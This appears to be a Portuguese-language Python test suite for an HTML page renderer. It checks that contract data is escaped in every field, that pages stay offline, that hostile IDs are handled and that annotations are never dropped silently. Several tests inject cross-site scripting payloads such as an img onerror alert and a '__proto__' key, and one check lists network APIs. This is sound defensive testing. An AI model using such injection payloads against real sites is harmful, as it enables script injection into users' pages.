            for contrato in (self._contrato_generico("mural", "D", 6, 8, "Escolher método", 1),
                             self._contrato_generico("horta", "B", 2, 5, "Definir sistema", 2)):
                uniao |= self._nos_estruturais(contrato)
        finally:
            globals()["render_direcoes"] = original
        novas = uniao - self._inventario()
        self.assertTrue(any(residuo in nova for nova in novas),
                        "o gate não enxerga prosa plantada em composto com dado variável")

    # literais já flagrados em revisão: entram por nome, não por heurística
    RESIDUOS_CONHECIDOS = ("stay", "Stay", "apartamento", "2026-08-19", "19/08/2026",
                           "27e54fe6", "Etapa 3 de 4", "5 caminhos", "recomendação (A)",
                           "bloco 2", "exemplo fictício", "Transcript", "Fixture",
                           "fixture", "Iris-design", "agent-af3dd382dc730cc74",
                           "lançar pelo chat", "Prazo estimado (exemplo)", "mcp-stay",
                           "planilha-importador", "Planilha padrão + importador")

    def test_nenhum_literal_da_semente_sobrevive(self):                     # r1/1
        arquivo = self._sem_ativos(self.html)
        for termo in self.RESIDUOS_CONHECIDOS:
            self.assertFalse(termo in arquivo, f"resíduo da semente na página: {termo!r}")
        fixture = RAIZ_DO_PLUGIN / "Prototypes" / "01-relatorio-direcoes.fixture.json"
        if not fixture.exists():
            return
        dados = json.loads(fixture.read_text(encoding="utf-8"))

        def textos(objeto):
            if isinstance(objeto, str):
                yield objeto
            elif isinstance(objeto, dict):
                for valor in objeto.values():
                    yield from textos(valor)
            elif isinstance(objeto, list):
                for valor in objeto:
                    yield from textos(valor)

        # nome e identificador de cada direção/critério da semente não podem aparecer
        # no que o usuário lê (no JSON embutido, "aderencia" é nome de campo, não resíduo)
        prosa = self._prosa(self.html)
        do_contrato = set(textos(self.neutro))
        # o inventário auditado é a autoridade sobre o que é vocabulário legítimo:
        # "custo" e "aderencia" são id de critério na semente E rótulo do produto
        auditado = (PASTA_DE_TEMPLATES / "prosa-estrutural-direcoes.txt").read_text(
            encoding="utf-8").lower()
        for item in dados.get("direcoes", []) + dados.get("criterios", []):
            for campo in ("id", "nome"):
                valor = item.get(campo)
                if not valor or valor in do_contrato or valor.lower() in auditado:
                    continue
                self.assertFalse(valor in prosa, f"resíduo da semente: {valor!r}")

    @staticmethod
    def _texto_visivel(pagina):
        """O texto que o leitor vê, com as marcações de origem já costuradas de volta."""
        sem_mudas = re.sub(r"<(script|style|title).*?</\1>", " ", pagina, flags=re.S)
        return " ".join(re.sub(r"<[^>]+>", "", sem_mudas).split())

    def test_contagem_etapa_e_letra_vem_do_contrato(self):                  # r1/1
        visivel = self._texto_visivel(self.html)
        for esperado in ("Etapa 7 de 9", "Escolher o torrador", "1 caminho",
                         "recomendação (B)", "escolher-torrador-de-cafe-2026-08-21"):
            self.assertTrue(esperado in visivel, f"faltou vir do contrato: {esperado!r}")
        self.assertTrue('data-dir-id="torrador-tambor"' in self.html,  # id vive em atributo
                        "a âncora da direção não veio do contrato")
        self.assertFalse("1 caminhos" in visivel, "plural errado com uma direção só")

    def test_etapa_ausente_nao_inventa_etapa(self):                         # decisão 19
        """A página nunca afirma o que o formulário não disse: sem `etapa` declarada,
        a linha some — em vez de ressuscitar 'Etapa 3 de 4 · Propor direções', que era
        o texto da tarefa que serviu de semente."""
        sem_etapa = json.loads(json.dumps(self.neutro))
        del sem_etapa["etapa"]
        pagina = self._prosa(render_direcoes(sem_etapa))
        for inventado in ("Etapa", "Propor direções", "de 4", "3 de"):
            self.assertFalse(inventado in pagina, f"etapa inventada na página: {inventado!r}")
        self.assertTrue("Você decide aqui" in pagina, "o chapéu do hero sumiu junto")
        self.assertTrue("temcomo" in pagina)

        com_etapa = render_direcoes(self.neutro)          # e o caminho normal segue igual
        visivel = self._texto_visivel(com_etapa)
        self.assertTrue("Etapa 7 de 9" in visivel and "Escolher o torrador" in visivel)
        self.assertTrue("Etapa 7 de 9 · Escolher o torrador — você decide aqui" in visivel)

    def test_etapa_ausente_continua_valida_no_contrato(self):               # decisão 19
        sem_etapa = json.loads(json.dumps(self.neutro))
        del sem_etapa["etapa"]
        erros = (validar_contra_schema(sem_etapa, carregar_schema("direcoes-v1"))
                 + regras_extras(sem_etapa))
        self.assertEqual(erros, [], "contrato sem etapa precisa continuar válido")

    def test_nenhum_dado_do_contrato_entra_em_seletor(self):                # r1/3
        interpoladas = re.findall(r"querySelector(?:All)?\([^)]*\+[^)]*\)", self.html)
        self.assertEqual(interpoladas, [], "dado do contrato entra cru em seletor CSS")

    def test_identificador_hostil_nao_quebra_a_pagina(self):                # r1/3
        hostil = json.loads(json.dumps(self.neutro))
        hostil["direcoes"][0]["id"] = 'dir-"aspas'
        hostil["recomendacao"]["direcao_id"] = 'dir-"aspas'
        pagina = render_direcoes(hostil)
        self.assertTrue('data-dir-id="dir-&quot;aspas"' in pagina, "o atributo não foi escapado")
        self.assertEqual(re.findall(r"querySelector(?:All)?\([^)]*\+[^)]*\)", pagina), [])

    def test_anotacao_sem_ancora_nao_some_sozinha(self):                    # r1/2
        # a decisão 17 proíbe descarte automático: sem bloco_id a anotação ainda
        # precisa chegar à lista de "manter ou jogar fora"
        self.assertFalse('if (typeof a.bloco_id !== "string" || typeof a.comentario !== "string") return null;'
                         in self.html, "anotação sem âncora ainda é descartada em silêncio")
        for marca in ("(bloco não recuperado do rascunho)", "BLOCO_NAO_RECUPERADO"):
            self.assertTrue(marca in self.html, f"faltou o marcador de âncora perdida: {marca}")

class TestEscapeEmTodoCampo(unittest.TestCase):
    """r2/1: nenhum ponto da página pode receber dado do contrato sem escape.
    A prova é por campo, um a um — não por amostra."""

    PAYLOAD = '<img src=x onerror="alert(1)">'

    @staticmethod
    def _caminhos_de_texto(objeto, caminho=()):
        if isinstance(objeto, str):
            yield caminho
        elif isinstance(objeto, dict):
            for chave, valor in objeto.items():
                yield from TestEscapeEmTodoCampo._caminhos_de_texto(valor, caminho + (chave,))
        elif isinstance(objeto, list):
            for i, valor in enumerate(objeto):
                yield from TestEscapeEmTodoCampo._caminhos_de_texto(valor, caminho + (i,))

    @staticmethod
    def _grava_em(documento, caminho, valor):
        alvo = documento
        for passo in caminho[:-1]:
            alvo = alvo[passo]
        alvo[caminho[-1]] = valor

    @staticmethod
    def _markup(pagina):
        """A página sem o bloco JSON: lá o dado é inerte, aqui é que ele viraria HTML."""
        abertura = '<script type="application/json" id="contrato-json">'
        inicio = pagina.index(abertura) + len(abertura)
        fim = pagina.index("</script>", inicio)
        return pagina[:inicio] + pagina[fim:]

    @staticmethod
    def _padroes_de_texto_do_schema(schema, caminho="$"):
        """Todo lugar onde o CONTRATO admite texto, lido da definição — não do exemplo.
        É o que prova que a fixture de ataque cobre o schema inteiro (receita r3/4)."""
        if not isinstance(schema, dict):
            return
        tipos = schema.get("type")
        tipos = [tipos] if isinstance(tipos, str) else list(tipos or [])
        aceita_texto = ("string" in tipos
                        or isinstance(schema.get("const"), str)
                        or (isinstance(schema.get("enum"), list)
                            and any(isinstance(v, str) for v in schema["enum"])))
        if aceita_texto:
            yield caminho
        for campo, sub in (schema.get("properties") or {}).items():
            yield from TestEscapeEmTodoCampo._padroes_de_texto_do_schema(sub, f"{caminho}.{campo}")
        if isinstance(schema.get("items"), dict):
            yield from TestEscapeEmTodoCampo._padroes_de_texto_do_schema(schema["items"],
                                                                         f"{caminho}[]")

    @staticmethod
    def _fixture_maxima():
        """Contrato válido com TODOS os ramos opcionais preenchidos — inclusive os que o
        exemplo não tem (`prototipo`, `aviso_prototipo`, `versao_prototipo`, `export`)."""
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        base["prototipo"] = True
        base["exemplo"] = True
        base["aviso_prototipo"] = "PROTÓTIPO — dados de exemplo"
        base["versao_prototipo"] = "v2 de teste"
        base["export"] = {"schema_version": "decisao-direcoes-v1",
                          "chave_localstorage": "temcomo:x:decisao-direcoes",
                          "storage_key": "temcomo:x:decisao-direcoes",
                          "nome_arquivo": "x.json", "download_nome": "x.json",
                          "estados": ["pendente", "decidida"], "observacao": "observação"}
        base["etapa"] = {"numero": 3, "total": 4, "nome": "Propor direções"}
        for direcao in base["direcoes"]:
            direcao.setdefault("letra", "A")
            direcao.setdefault("origem_leiga", "Origem")
            direcao.setdefault("custo_leigo", "Custo por extenso")
            direcao.setdefault("custo_curto", "curto")
            direcao.setdefault("resumo", "resumo")
            direcao["consequencias"].setdefault("prazo", "prazo")
            direcao["consequencias"].setdefault("primeiro_passo", "primeiro passo")
            direcao["consequencias"].setdefault("vs_recomendada", "versus")
        return base

    def test_a_fixture_de_ataque_cobre_o_schema_inteiro(self):              # r3/4
        schema = carregar_schema("direcoes-v1")
        padroes = set(self._padroes_de_texto_do_schema(schema))
        fixture = self._fixture_maxima()
        presentes = {re.sub(r"\[\d+\]", "[]", ".".join(str(p) for p in ("$",) + caminho))
                     .replace("$.", "$.", 1)
                     for caminho in self._caminhos_de_texto(fixture)}
        presentes = {re.sub(r"\.(\d+)(?=\.|$)", "[]", p) for p in presentes}
        ausentes = {padrao for padrao in padroes if padrao not in presentes}
        self.assertEqual(ausentes, set(),
                         f"o schema admite texto onde a fixture não põe nada: {sorted(ausentes)}")

    def test_todo_campo_de_texto_do_contrato_e_escapado(self):
        base = self._fixture_maxima()
        caminhos = list(self._caminhos_de_texto(base))
        self.assertGreater(len(caminhos), 30, "o contrato de teste precisa ser rico")
        for caminho in caminhos:
            documento = json.loads(json.dumps(base))
            self._grava_em(documento, caminho, self.PAYLOAD)
            markup = self._markup(render_direcoes(documento))
            trilha = ".".join(str(p) for p in caminho)
            self.assertFalse("<img src=x" in markup, f"campo sem escape: {trilha}")
            self.assertFalse('onerror="alert(1)"' in markup, f"campo sem escape: {trilha}")

    def test_tarefa_id_hostil_no_rodape(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        base["tarefa_id"] = 'mural</p><img id="xss-r2" src="x" onerror="alert(1)"><p>'
        markup = self._markup(render_direcoes(base))
        self.assertFalse('id="xss-r2"' in markup, "o rodapé virou porta de entrada")
        self.assertFalse("</p><img" in markup)

    def test_prosa_estrutural_nao_chama_o_dado_real_de_exemplo(self):        # r2/2
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        real = json.loads(json.dumps(base))
        real.pop("exemplo", None)
        real.pop("prototipo", None)
        pagina = render_direcoes(real)
        # o que o motor escreve (os rótulos) não pode chamar o dado real de exemplo;
        # o VALOR pode dizer o que o contrato disser — ali quem fala é o autor.
        rotulos = re.findall(r'<div class="cf-label">([^<]*)</div>', pagina)
        self.assertIn("Prazo estimado", rotulos)
        for rotulo in rotulos:
            self.assertFalse("exemplo" in rotulo.lower(),
                             f"rótulo do motor chama o dado real de exemplo: {rotulo!r}")

    def test_letra_ausente_nao_vira_undefined(self):                        # r2/4
        """O HTML entregue não pode mostrar 'undefined' quando o contrato não dá letra.

        Até a auditoria cega, este teste exigia a letra DENTRO do JSON embutido — era o
        motor pondo no documento um dado que ninguém declarou. Agora a letra é derivada
        dos dois lados (aqui e em `letraDe`, no JavaScript), e o que se cobra é o
        resultado: nenhuma letra inventada no documento, nenhum 'undefined' na página."""
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        for direcao in base["direcoes"]:
            direcao.pop("letra", None)
        pagina = render_direcoes(base)
        abertura = '<script type="application/json" id="contrato-json">'
        inicio = pagina.index(abertura) + len(abertura)
        embutido = json.loads(pagina[inicio:pagina.index("</script>", inicio)]
                              .replace("<\\/", "</"))
        self.assertEqual([d.get("letra") for d in embutido["direcoes"]], [None, None, None])
        letras = re.findall(r'<span class="letter-pill"><span data-origem-contrato>'
                            r'([^<]*)</span>', pagina)
        self.assertEqual(letras, ["A", "B", "C", "A", "B", "C"],
                         "a apresentação precisa derivar a letra da posição")
        # e o texto que o boot recalcula não pode virar "recomendação (undefined)"
        self.assertFalse("undefined" in re.sub(r"<script>.*?</script>", "", pagina, flags=re.S))

    def test_javascript_deriva_a_letra_quando_o_contrato_nao_da(self):
        """O outro lado da mesma correção: sem `letra` no documento, `letraDe` calcula."""
        node = shutil.which("node")
        if not node:
            self.skipTest("Node não está instalado nesta máquina")
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        for direcao in base["direcoes"]:
            direcao.pop("letra", None)
        pagina = render_direcoes(base)
        with tempfile.TemporaryDirectory() as tmp:
            alvo = Path(tmp) / "pagina.html"
            alvo.write_text(pagina, encoding="utf-8")
            script = Path(tmp) / "h.js"
            script.write_text("""
            const fs = require("fs");
            const pagina = fs.readFileSync(process.argv[2], "utf8");
            const abertura = '<script type="application/json" id="contrato-json">';
            const i = pagina.indexOf(abertura) + abertura.length;
            const CONTRATO = JSON.parse(pagina.slice(i, pagina.indexOf("</scr" + "ipt>", i))
                                              .replace(/<\\\\\\//g, "</"));
            const DIRS = CONTRATO.direcoes;
            const inicio = pagina.indexOf("function letraDe(");
            let nivel = 0, fim = inicio;
            for (let j = pagina.indexOf("{", inicio); j < pagina.length; j++) {
              if (pagina[j] === "{") nivel++;
              else if (pagina[j] === "}" && --nivel === 0) { fim = j + 1; break; }
            }
            eval(pagina.slice(inicio, fim));
            console.log(JSON.stringify(DIRS.map(letraDe)));
            """, encoding="utf-8")
            saida = subprocess.run([node, str(script), str(alvo)],
                                   capture_output=True, text=True)
        self.assertEqual(saida.returncode, 0, saida.stderr[-800:])
        self.assertEqual(json.loads(saida.stdout), ["A", "B", "C"])

class TestRestauracaoDeRascunho(unittest.TestCase):
    """Executa o JavaScript real da página (decisão 17), quando há Node por perto."""

    HARNESS = """
    const fs = require("fs");
    const pagina = fs.readFileSync(process.argv[2], "utf8");
    function corpoDaFuncao(nome) {
      const inicio = pagina.indexOf("function " + nome + "(");
      if (inicio < 0) throw new Error("não achei a função " + nome);
      let nivel = 0, i = pagina.indexOf("{", inicio);
      for (let j = i; j < pagina.length; j++) {
        if (pagina[j] === "{") nivel++;
        else if (pagina[j] === "}" && --nivel === 0) return pagina.slice(inicio, j + 1);
      }
      throw new Error("função " + nome + " não fecha");
    }
    let anotacoes = [];
    const TRECHO_NAO_RECUPERADO = "(trecho não recuperado do rascunho)";
    const BLOCO_NAO_RECUPERADO = "(bloco não recuperado do rascunho)";
    let contador = 0;
    function annotId() { return "gerado-" + (++contador); }
    const inicioSem = pagina.indexOf("var SEM_CONTEUDO =");
    eval(pagina.slice(inicioSem, pagina.indexOf("})();", inicioSem) + 5));
    eval(corpoDaFuncao("temConteudo"));
    eval(corpoDaFuncao("idInternoEstavel"));
    eval(corpoDaFuncao("sanitizeAnnot"));
    eval(corpoDaFuncao("sanitizarAnotacoes"));
    eval(corpoDaFuncao("exportAnnot"));
    eval(corpoDaFuncao("anotacoesPendentes"));
    eval(corpoDaFuncao("registrarAncoraPerdida"));
    const doRascunho = [
      { id: "a-inteira", bloco_id: "objetivo", trecho: "um trecho de verdade",
        comentario: "esta está inteira", criado_em: "2026-08-20T10:00:00Z" },
      { id: "a-sem-trecho", bloco_id: "objetivo", trecho: "",
        comentario: "perdi o trecho", criado_em: "2026-08-20T10:01:00Z" },
      { id: "a-sem-bloco", trecho: "sobrou o trecho",
        comentario: "perdi a âncora", criado_em: "2026-08-20T10:02:00Z" },
      { id: "a-so-comentario", comentario: "só sobrou o que eu escrevi" },
      { id: "a-invisivel", bloco_id: "objetivo", trecho: "x",
        comentario: "\u200b\u200c\u2060", criado_em: "2026-08-20T10:03:00Z" },
      { nada: true }
    ];
    anotacoes = sanitizarAnotacoes(doRascunho);
    const momento = "2026-08-21T12:00:00Z";
    // âncora que aponta para bloco inexistente: o boot descobre e devolve para a fila
    const ancoraQuebrada = sanitizeAnnot({ id: "a-bloco-fantasma", bloco_id: "bloco-que-sumiu",
      trecho: "um trecho qualquer", comentario: "meu bilhete",
      criado_em: "2026-08-20T10:04:00Z" });
    const antesDoBoot = { incompleta: ancoraQuebrada.incompleta };
    registrarAncoraPerdida(ancoraQuebrada);
    const jaMantida = sanitizeAnnot({ id: "a-ja-mantida", bloco_id: "b", trecho: "t",
      comentario: "já resolvi esta", criado_em: "2026-08-20T10:05:00Z" });
    jaMantida.resolucao = "manter";
    registrarAncoraPerdida(jaMantida);
    // receita r3/1: salvar o rascunho e restaurar de novo não pode esquecer o "manter"
    const mantida = sanitizeAnnot({ id: "a-mantida", bloco_id: "b", trecho: "t",
      comentario: "vou mandar manter", criado_em: "2026-08-20T10:06:00Z" });
    registrarAncoraPerdida(mantida);
    mantida.resolucao = "manter";
    const salvo = JSON.parse(JSON.stringify([mantida]));      // vai para o localStorage
    const depoisDaRecarga = sanitizarAnotacoes(salvo);
    depoisDaRecarga.forEach(registrarAncoraPerdida);          // o boot reencontra a órfã
    const anotacoesAntes = anotacoes;
    anotacoes = depoisDaRecarga;
    const pendentesAposRecarga = anotacoesPendentes().map(a => a.id);
    anotacoes = anotacoesAntes;
    console.log(JSON.stringify({
      recarga: { resolucao: depoisDaRecarga[0].resolucao,
                 incompleta: depoisDaRecarga[0].incompleta,
                 pendentes: pendentesAposRecarga },
      restauradas: anotacoes.map(a => a.id),
      pendentes: anotacoesPendentes().map(a => a.id),
      exportadas: anotacoes.map(a => exportAnnot(a, momento)),
      ancoraQuebrada: { antes: antesDoBoot.incompleta, depois: ancoraQuebrada.incompleta,
                        status: ancoraQuebrada.ancora_status },
      jaMantida: { incompleta: jaMantida.incompleta, resolucao: jaMantida.resolucao }
    }));
    """

    def test_nada_e_descartado_sem_o_usuario_mandar(self):                  # r1/2
        node = shutil.which("node")
        if not node:
            self.skipTest("Node não está instalado nesta máquina")
        contrato = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                              .read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as pasta:
            pagina = Path(pasta) / "pagina.html"
            pagina.write_text(render_direcoes(contrato), encoding="utf-8")
            script = Path(pasta) / "harness.cjs"
            script.write_text(self.HARNESS, encoding="utf-8")
            saida = subprocess.run([node, str(script), str(pagina)],
                                   capture_output=True, text=True)
            self.assertEqual(saida.returncode, 0, saida.stderr[-800:])
            resultado = json.loads(saida.stdout)

        # `a-invisivel` tem âncora inteira e comentário só com invisíveis. Até a
        # auditoria cega ela era descartada no reload; agora sobrevive como marcador,
        # porque a interface promete que o comentário pode ficar em branco. Some só
        # o que não tem nada: nem bilhete, nem trecho, nem âncora.
        self.assertEqual(resultado["restauradas"],
                         ["a-inteira", "a-sem-trecho", "a-sem-bloco", "a-so-comentario",
                          "a-invisivel"],
                         "alguma anotação com conteúdo humano foi descartada sozinha")
        self.assertEqual(resultado["pendentes"],
                         ["a-sem-trecho", "a-sem-bloco", "a-so-comentario"],
                         "anotação incompleta não foi para a fila de confirmação")
        por_id = {a["id"]: a for a in resultado["exportadas"]}
        self.assertEqual(por_id["a-inteira"]["trecho"], "um trecho de verdade")
        self.assertEqual(por_id["a-inteira"]["ancora_status"], "resolvida")
        for identificador in ("a-sem-trecho", "a-sem-bloco", "a-so-comentario"):
            anotacao = por_id[identificador]
            self.assertEqual(anotacao["ancora_status"], "orfa", identificador)
            self.assertTrue(anotacao["bloco_id"], identificador)
            self.assertTrue(anotacao["trecho"], identificador)
            self.assertGreaterEqual(len(anotacao["criado_em"]), 10, identificador)
        self.assertEqual(por_id["a-sem-trecho"]["comentario"], "perdi o trecho")

class TestRenderGrill(unittest.TestCase):
    """Task 6: a rodada de grill nasce do template aprovado, com a identidade
    byte-preservada — e já com todas as classes que as três rodadas da Task 5 pagaram."""

    @classmethod
    def setUpClass(cls):
        cls.contrato = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                                  .read_text(encoding="utf-8"))
        cls.html = render_grill(cls.contrato)

    @staticmethod
    def _bloco_root(texto):
        inicio = texto.index(":root {")
        return texto[inicio:texto.index("\n}", inicio) + 2]

    @staticmethod
    def _sem_ativos(pagina):
        return re.sub(r"data:[a-z/]+;base64,[A-Za-z0-9+/=]+", "«ativo»", pagina)

    @staticmethod
    def _markup(pagina):
        abertura = '<script type="application/json" id="contrato-json">'
        inicio = pagina.index(abertura) + len(abertura)
        return pagina[:inicio] + pagina[pagina.index("</script>", inicio):]

    def test_tokens_e_fontes_byte_identicos_ao_prototipo(self):
        dos_assets = (PASTA_DE_ASSETS / "tokens-grill.css").read_text(encoding="utf-8")
        self.assertEqual(self._bloco_root(self.html), self._bloco_root(dos_assets))
        fontes = re.findall(r"@font-face \{[^}]*\}", self.html)
        self.assertEqual(len(fontes), 8, "a identidade tipográfica mudou")
        prototipo = RAIZ_DO_PLUGIN / "Prototypes" / "02-rodada-grill.html"
        if prototipo.exists():          # contrato visual aprovado (decisão 11)
            texto = prototipo.read_text(encoding="utf-8")
            self.assertEqual(self._bloco_root(self.html), self._bloco_root(texto))
            self.assertEqual(fontes, re.findall(r"@font-face \{[^}]*\}", texto))

    def test_offline_de_verdade(self):
        externos = [m for m in re.findall(r'(?:src|href)\s*=\s*"([^"]*)"', self.html)
                    if m.startswith(("http:", "https:", "//"))]
        self.assertEqual(externos, [], "a página busca coisa na rede")
        for suspeito in ("fonts.googleapis", "fetch(", "XMLHttpRequest", "WebSocket",
                         "importScripts"):
            self.assertFalse(suspeito in self.html, f"a página pode ir à rede: {suspeito}")

    def test_proveniencia_e_determinismo(self):
        sha = sha_do_contrato(self.contrato)
        self.assertTrue(f"<!-- temcomo engine v{ENGINE_VERSION} · contrato sha256 {sha} -->"
                        in self.html, "falta o comentário de proveniência")
        self.assertTrue(render_grill(self.contrato) == self.html, "render 2× divergiu")
        self.assertTrue(render_grill(json.loads(json.dumps(self.contrato))) == self.html)

    def test_rodada_ausente_reprova_em_vez_de_inventar_a_primeira(self):
        sem_rodada = json.loads(json.dumps(self.contrato))
        sem_rodada.pop("rodada")
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit) as ctx:
            render_grill(sem_rodada)
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("campo obrigatório 'rodada' está ausente", erro.getvalue())
        self.assertNotIn("Traceback", erro.getvalue())

    def test_titulo_so_mostra_a_pergunta_quando_ela_foi_declarada(self):
        sem_tarefa = json.loads(json.dumps(self.contrato))
        sem_tarefa.pop("tarefa", None)
        titulo_sem_tarefa = re.search(r"<title>(.*?)</title>",
                                      render_grill(sem_tarefa), re.S).group(1)
        self.assertEqual(titulo_sem_tarefa,
                         f"Perguntas para fechar o entendimento · Rodada {self.contrato['rodada']}")
        self.assertNotIn(self.contrato["tarefa_id"], titulo_sem_tarefa)

        so_direcao = json.loads(json.dumps(sem_tarefa))
        so_direcao["tarefa"] = {"direcao_escolhida": "Direção que veio do contrato"}
        titulo_so_direcao = re.search(r"<title>(.*?)</title>",
                                      render_grill(so_direcao), re.S).group(1)
        self.assertEqual(titulo_so_direcao, titulo_sem_tarefa)

        com_pergunta = json.loads(json.dumps(so_direcao))
        com_pergunta["tarefa"]["pergunta_original"] = "Pergunta realmente declarada?"
        titulo_com_pergunta = re.search(r"<title>(.*?)</title>",
                                        render_grill(com_pergunta), re.S).group(1)
        self.assertTrue(titulo_com_pergunta.endswith(" · Pergunta realmente declarada?"))

    def test_callout_de_irreversibilidade_so_onde_e_dificil_voltar(self):
        irreversiveis = [q for q in self.contrato["perguntas"] if q["reversivel"] is False]
        reversiveis = [q for q in self.contrato["perguntas"] if q["reversivel"] is not False]
        self.assertTrue(irreversiveis and reversiveis, "o exemplo precisa dos dois casos")
        self.assertEqual(self.html.count('class="irrev-callout"'), len(irreversiveis),
                         "um callout por pergunta difícil de voltar atrás, nem mais nem menos")
        for pergunta in irreversiveis:
            aviso = pergunta.get("irreversivel_aviso")
            self.assertTrue(html.escape(aviso) in self.html, "o aviso do contrato sumiu")
        for pergunta in reversiveis:
            trecho = self._recorte_da_pergunta(pergunta["id"])
            self.assertFalse("irrev-callout" in trecho, f"callout indevido em {pergunta['id']}")
            self.assertTrue("dá para mudar depois" in trecho)

    def _recorte_da_pergunta(self, identificador):
        marca = f'data-pergunta-id="{html.escape(identificador)}"'
        inicio = self.html.index(marca)
        fim = self.html.find("</details>", inicio)
        return self.html[inicio:fim]

    def test_callout_usa_o_texto_do_plano_quando_o_contrato_nao_traz(self):
        sem_aviso = json.loads(json.dumps(self.contrato))
        for pergunta in sem_aviso["perguntas"]:
            if pergunta["reversivel"] is False:
                pergunta.pop("irreversivel_aviso", None)
        pagina = render_grill(sem_aviso)
        self.assertTrue("Difícil voltar atrás: esta decisão não tem como ser desfeita depois "
                        "— escolha com calma." in pagina, "faltou o aviso padrão do plano")

    def test_conteudo_do_contrato_esta_no_documento(self):
        def presente(trecho, pista):
            self.assertTrue(trecho in self.html, f"faltou na página: {pista}")
        for pergunta in self.contrato["perguntas"]:
            presente(html.escape(pergunta["pergunta"]), f"pergunta {pergunta['id']}")
            presente(html.escape(pergunta["impacto_curto"]), f"impacto de {pergunta['id']}")
            presente(f'data-pergunta-id="{pergunta["id"]}"', f"âncora de {pergunta['id']}")
            for opcao in pergunta["opcoes"]:
                presente(html.escape(opcao["titulo"]), f"opção {opcao['id']}")
        presente(self.contrato["tarefa_id"], "identificador da tarefa")

    def test_nenhum_dado_do_contrato_entra_em_seletor(self):
        self.assertEqual(re.findall(r"querySelector(?:All)?\([^)]*\+[^)]*\)", self.html), [],
                         "dado do contrato entra cru em seletor CSS")

    def test_identificador_hostil_nao_quebra_a_pagina(self):
        hostil = json.loads(json.dumps(self.contrato))
        hostil["perguntas"][0]["id"] = 'q-"[🙂]'
        hostil["perguntas"][1]["id"] = "__proto__"
        hostil["perguntas"][0]["opcoes"][0]["id"] = "opt'[🙂]"
        pagina = render_grill(hostil)
        self.assertTrue('data-pergunta-id="q-&quot;[🙂]"' in pagina, "atributo não escapado")
        self.assertTrue('data-pergunta-id="__proto__"' in pagina)
        self.assertEqual(re.findall(r"querySelector(?:All)?\([^)]*\+[^)]*\)", pagina), [])

        node = shutil.which("node")
        if not node:
            self.skipTest("Node não está instalado nesta máquina")
        script = r'''
const pagina = require("fs").readFileSync(process.argv[1], "utf8");
const expressoes = {
  idx: /var IDX = ([^;]+);/.exec(pagina)[1],
  respostas: /\n    respostas: ([^,\n]+),/.exec(pagina)[1],
  casas: /var homeOf = ([^;]+);/.exec(pagina)[1]
};
const ids = ['q-"[🙂]', "__proto__"];
const resultado = {};
for (const [nome, expressao] of Object.entries(expressoes)) {
  const mapa = Function("return (" + expressao + ")")();
  ids.forEach((id, i) => { mapa[id] = { indice: i }; });
  resultado[nome] = {
    proprias: ids.map(id => Object.prototype.hasOwnProperty.call(mapa, id)),
    indices: ids.map(id => mapa[id] && mapa[id].indice),
    serializado: JSON.stringify(mapa)
  };
}
console.log(JSON.stringify(resultado));
'''
        with tempfile.TemporaryDirectory() as pasta:
            arquivo = Path(pasta) / "hostil.html"
            arquivo.write_text(pagina, encoding="utf-8")
            saida = subprocess.run([node, "-e", script, str(arquivo)],
                                   capture_output=True, text=True)
        self.assertEqual(saida.returncode, 0, saida.stderr)
        mapas = json.loads(saida.stdout)
        for nome, resultado in mapas.items():
            self.assertEqual(resultado["proprias"], [True, True], nome)
            self.assertEqual(resultado["indices"], [0, 1], nome)
            self.assertTrue("__proto__" in resultado["serializado"], nome)

    def test_identificador_que_o_dom_normalizaria_reprova_fechado(self):
        for caminho, controle in (("pergunta", "\x00"), ("opção", "\r")):
            instavel = json.loads(json.dumps(self.contrato))
            if caminho == "pergunta":
                instavel["perguntas"][0]["id"] = "q" + controle + "instável"
            else:
                instavel["perguntas"][0]["opcoes"][0]["id"] = "o" + controle + "instável"
            erros = (validar_contra_schema(instavel, carregar_schema("grill-rodada-v1"))
                     + regras_extras(instavel))
            self.assertTrue(any("navegador altera" in erro for erro in erros),
                            f"id de {caminho} mudaria ao entrar no DOM: {erros}")

    def test_ids_validos_nao_colidem_nos_ids_internos_do_dom(self):
        hostil = json.loads(json.dumps(self.contrato))
        hostil["perguntas"][0]["id"] = "x"
        hostil["perguntas"][1]["id"] = "title-x"
        pagina = render_grill(hostil)

        class ColetorDeIds(HTMLParser):
            def __init__(self):
                super().__init__()
                self.ids = []
            def handle_starttag(self, _tag, atributos):
                self.ids.extend(valor for nome, valor in atributos if nome == "id")

        coletor = ColetorDeIds()
        coletor.feed(pagina)
        repetidos = sorted({identificador for identificador in coletor.ids
                            if coletor.ids.count(identificador) > 1})
        self.assertEqual(repetidos, [], f"ids internos repetidos no DOM: {repetidos}")
        self.assertNotIn('getElementById("card-" + qid)', pagina)

    def test_faixa_de_exemplo_so_com_exemplo_verdadeiro(self):
        self.assertTrue("PROTÓTIPO" in self.html)
        real = json.loads(json.dumps(self.contrato))
        real.pop("exemplo", None)
        real.pop("prototipo", None)
        self.assertFalse("PROTÓTIPO" in render_grill(real), "faixa de exemplo em contrato real")

    def test_export_declara_quem_preencheu_e_usa_o_nome_unificado(self):
        self.assertTrue('produzido_por: { agente: "usuario" }' in self.html)
        chave = f"temcomo:{self.contrato['tarefa_id']}:grill-rodada-{self.contrato['rodada']}"
        self.assertTrue(chave in self.html, f"faltou a chave de rascunho {chave!r}")
        self.assertTrue("chave_localstorage" in self.html)
        self.assertFalse("storage_key" in self.html, "voltou o nome divergente")
        self.assertFalse("download_nome" in self.html)

    def test_decisao_17_esta_na_pagina(self):
        for marca in ("(trecho não recuperado do rascunho)", "(bloco não recuperado do rascunho)",
                      "anotacoes-incompletas", "Manter a anotação", "Jogar fora",
                      "anotacoesPendentes", "registrarAncoraPerdida",
                      "nada é jogado fora sem você mandar"):
            self.assertTrue(marca in self.html, f"decisão 17: faltou {marca!r}")
